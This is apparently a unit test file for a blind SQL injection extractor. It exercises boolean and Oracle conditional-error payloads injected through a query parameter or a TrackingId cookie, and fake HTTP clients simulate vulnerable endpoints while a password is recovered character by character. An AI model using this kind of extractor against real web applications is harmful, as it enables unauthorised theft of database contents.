"""Composition tests for the dependency-injected extractor."""

import re
import unittest
from collections.abc import Mapping

from core import BinarySearchStrategy, BlindExtractor, BruteForceStrategy
from detection import ErrorDetector, TextDetector
from models import HttpResponseData, RequestData
from payloads import (
    AsciiSubstringConditionBuilder,
    BooleanPayloadBuilder,
    ConditionalErrorPayloadBuilder,
    CookieInjectionPoint,
    OracleAsciiSubstringConditionBuilder,
    QueryParameterInjectionPoint,
)
from transport import HttpClient


class ConditionAwareFakeHttpClient(HttpClient):
    """Simulate a boolean SQL endpoint without making network requests."""

    def __init__(self, values: Mapping[int, str]) -> None:
        self.values = values
        self.requests = []

    def send(self, request: RequestData) -> HttpResponseData:
        self.requests.append(request)
        payload = request.query["tracking"]
        if "LENGTH(" in payload:
            length_match = re.search(r"LENGTH\((.*)\)([<>=]+)(\d+)", payload)
            assert length_match is not None
            operator = length_match.group(2)
            position = int(length_match.group(3))
            actual_length = len("".join(self.values.values()))
            is_true = {
                "<": actual_length < position,
                "<=": actual_length <= position,
                "=": actual_length == position,
                ">": actual_length > position,
                ">=": actual_length >= position,
            }[operator]
            return HttpResponseData(200, "TRUE" if is_true else "FALSE")
        position_match = re.search(r"SUBSTRING\([^,]+,(\d+),1\)", payload)
        condition_match = re.search(r"([<>]?=)(\d+)\)", payload)
        assert position_match is not None
        assert condition_match is not None
        position = int(position_match.group(1))
        operator = condition_match.group(1)
        candidate = int(condition_match.group(2))
        actual = ord(self.values.get(position, "\0"))
        is_true = actual == candidate if operator == "=" else actual >= candidate
        return HttpResponseData(200, "TRUE" if is_true else "FALSE")


class OracleConditionalErrorFakeHttpClient(HttpClient):
    """Simulate Oracle conditional errors without making network requests."""

    def __init__(self, value: str) -> None:
        self.value = value
        self.requests = []

    def send(self, request: RequestData) -> HttpResponseData:
        self.requests.append(request)
        payload = request.cookies["TrackingId"]
        if "LENGTH(" in payload:
            length_match = re.search(r"LENGTH\((.*)\)([<>=]+)(\d+)", payload)
            assert length_match is not None
            operator = length_match.group(2)
            position = int(length_match.group(3))
            is_true = {
                "<": len(self.value) < position,
                "<=": len(self.value) <= position,
                "=": len(self.value) == position,
                ">": len(self.value) > position,
                ">=": len(self.value) >= position,
            }[operator]
            return HttpResponseData(500 if is_true else 200, "ORA-01476" if is_true else "OK")
        position_match = re.search(r"SUBSTR\(password,(\d+),1\)", payload)
        condition_match = re.search(r"\)([<>]=?|=)(\d+)\) THEN", payload)
        assert position_match is not None
        assert condition_match is not None
        position = int(position_match.group(1))
        operator = condition_match.group(1)
        candidate = int(condition_match.group(2))
        actual = ord(self.value[position - 1]) if position <= len(self.value) else 0
        is_true = actual == candidate if operator == "=" else actual <= candidate
        return HttpResponseData(500 if is_true else 200, "ORA-01476" if is_true else "OK")


def build_extractor(strategy, client):
    return BlindExtractor(
        http_client=client,
        condition_builder=AsciiSubstringConditionBuilder(),
        payload_builder=BooleanPayloadBuilder(),
        injection_point=QueryParameterInjectionPoint("tracking"),
        detector=TextDetector("TRUE"),
        search_strategy=strategy,
        base_request=RequestData(
            "https://example.test/filter",
            query={"tracking": "base"},
        ),
        charset="abc",
        max_length=3,
    )


class BlindExtractorTests(unittest.TestCase):
    def test_composes_brute_force_dependencies_and_stops_at_missing_character(self) -> None:
        client = ConditionAwareFakeHttpClient({1: "a", 2: "b"})
        extractor = build_extractor(BruteForceStrategy(), client)

        result = extractor.extract("secret()")

        self.assertEqual(result.value, "ab")
        self.assertTrue(result.complete)
        self.assertEqual([item.character for item in result.characters], ["a", "b"])
        self.assertIn("LENGTH(secret())<1", client.requests[0].query["tracking"])
        self.assertTrue(
            any("ASCII(SUBSTRING(secret(),1,1))=97" in request.query["tracking"]
                for request in client.requests)
        )
        self.assertIn("LENGTH(secret())<3", client.requests[-1].query["tracking"])

    def test_composes_binary_strategy_with_threshold_operator(self) -> None:
        client = ConditionAwareFakeHttpClient({1: "c"})
        extractor = build_extractor(BinarySearchStrategy(), client)

        result = extractor.extract("secret()")

        self.assertEqual(result.value, "c")
        self.assertTrue(result.complete)
        self.assertTrue(any(">=" in request.query["tracking"] for request in client.requests))

    def test_does_not_wait_when_delay_is_zero_and_rejects_invalid_limits(self) -> None:
        client = ConditionAwareFakeHttpClient({1: "a"})
        with self.assertRaises(ValueError):
            build_extractor(BruteForceStrategy(), client).extract(" ")

        with self.assertRaises(ValueError):
            BlindExtractor(
                http_client=client,
                condition_builder=AsciiSubstringConditionBuilder(),
                payload_builder=BooleanPayloadBuilder(),
                injection_point=QueryParameterInjectionPoint("tracking"),
                detector=TextDetector("TRUE"),
                search_strategy=BruteForceStrategy(),
                base_request=RequestData("https://example.test", query={"tracking": "x"}),
                charset="abc",
                max_length=0,
            )

    def test_reports_progress_without_logging_payload_or_expression(self) -> None:
        client = ConditionAwareFakeHttpClient({1: "a"})
        extractor = build_extractor(BruteForceStrategy(), client)

        with self.assertLogs("core.extractor", level="INFO") as logs:
            extractor.extract("secret()")

        joined = "\n".join(logs.output)
        self.assertIn("Position 1/3 resolved as a", joined)
        self.assertNotIn("secret()", joined)
        self.assertNotIn("TrackingId", joined)

    def test_extracts_multiple_characters_from_oracle_conditional_errors(self) -> None:
        client = OracleConditionalErrorFakeHttpClient("cab")
        extractor = BlindExtractor(
            http_client=client,
            condition_builder=OracleAsciiSubstringConditionBuilder(),
            payload_builder=ConditionalErrorPayloadBuilder(),
            injection_point=CookieInjectionPoint("TrackingId"),
            detector=ErrorDetector(error_status=500),
            search_strategy=BinarySearchStrategy("<="),
            base_request=RequestData(
                "https://example.test/filter",
                cookies={"TrackingId": "base", "session": "token"},
            ),
            charset="abc",
            max_length=3,
        )

        result = extractor.extract("password")

        self.assertEqual(result.value, "cab")
        self.assertTrue(result.complete)
        self.assertTrue(all(request.cookies["session"] == "token" for request in client.requests))

    def test_extracts_with_brute_force_and_error_text(self) -> None:
        client = OracleConditionalErrorFakeHttpClient("ba")
        extractor = BlindExtractor(
            http_client=client,
            condition_builder=OracleAsciiSubstringConditionBuilder(),
            payload_builder=ConditionalErrorPayloadBuilder(),
            injection_point=CookieInjectionPoint("TrackingId"),
            detector=ErrorDetector(error_text="ORA-01476"),
            search_strategy=BruteForceStrategy(),
            base_request=RequestData("https://example.test/filter", cookies={"TrackingId": "base"}),
            charset="abc",
            max_length=2,
        )

        result = extractor.extract("password")

        self.assertEqual(result.value, "ba")
        self.assertTrue(result.complete)


if __name__ == "__main__":
    unittest.main()
